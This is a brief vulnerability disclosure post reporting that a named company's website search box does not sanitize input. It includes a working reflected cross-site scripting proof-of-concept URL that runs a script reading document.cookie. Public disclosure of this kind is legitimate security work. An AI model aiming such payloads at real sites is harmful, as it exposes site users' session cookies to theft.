Subject: Input not sanitized in Emerson network power

Found this search box last month which is not sanitizing any input :

http://www.emersonnetworkpower.com/en-US/SearchCenter/Pages/AllResults.aspx?k=%3Cscript%3Ealert(document.cookie)%3C/script%3E&s=Network%20Power%20Content_en-US_en-US

Have contacted the owner but there isn't any response. May be the
vulnerability isn't serious enough to exploit ....
